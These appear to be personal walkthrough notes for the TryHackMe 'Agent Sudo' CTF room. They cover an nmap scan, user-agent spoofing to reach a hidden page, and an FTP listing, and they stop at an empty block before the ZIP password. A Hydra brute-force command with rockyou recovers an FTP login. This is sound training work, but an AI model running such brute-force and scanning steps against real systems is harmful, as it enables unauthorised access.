> [!info]
> You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.
> Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!

![](assets/Agent%20Sudo.png)
> [!important]
> Target IP: 10.65.183.121

> [!question]
> How many open ports?

> [!note]
> Running an nmap scan as follows revealed the relevant open ports:
> ```
> ┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- 10.65.183.121
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-07 08:20 EST
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 9.17% done; ETC: 08:23 (0:02:19 remaining)
Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 32.13% done; ETC: 08:23 (0:01:29 remaining)
Nmap scan report for 10.65.183.121
Host is up (0.085s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
Nmap done: 1 IP address (1 host up) scanned in 118.77 seconds
> ```

> [!question]
> How you redirect yourself to a secret page?

> [!note]
> Just put the target IP in firefox and got the answer user-agent:
>![](assets/user-agent%20mainpage.png)

> [!question]
> What is the agent name?

> [!note]
> Had to get a hint and realised user-agent can be amended via firefox so used claude to help on how to change user-agent - noticed agent at bottom was named agent R so they use first letter of name only so logically I would ahve to go to A then B and then got the answer at C
> ![](assets/Agent%20Chris.png)

> [!info]
> In the extract above, not only do we learn about the name chris, we know theres a agent J and Chris has a weak password

> [!question]
> FTP password

> [!note]
> Got a hint of hail hydra from THM so searched it up and need to understand that tool for certain use case but anyway got the FTP password as crystal:
> ```
> ┌──(kali㉿kali)-[~]
└─$ hydra -l chris -P /usr/share/wordlists/rockyou.txt  ftp://10.65.183.121
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-07 08:51:11
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.65.183.121:21/
[21][ftp] host: 10.65.183.121   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-07 08:52:07
> ```

> [!question]
> Zip file password

> [!info]
> I can see the path from here and it will be to access ftp and get a zip file - once downloaded onto attack machine, use zip2john to get zip password and read contents of file. Let's see anyway

> [!note]
> hmm guess i was wrong? lets read what we have here or see...
> ```
> ftp> ls
229 Entering Extended Passive Mode (|||24980|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
> ```

> [!note]
> .txt file revealed the following:
> ```
> > ┌──(kali㉿kali)-[~]
└─$ cat To_agentJ.txt          
Dear agent J,
All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
From,
Agent C
> ```
> and images were as follows:
> ![](assets/Alien%20images.png)
> i need to find out if images have anything useful via steganography

> [!note]
> OK used claude as I knew what I needed to do and went down a rabbit hole that led me to the ZIP password as follows:
> ```
> 
> ```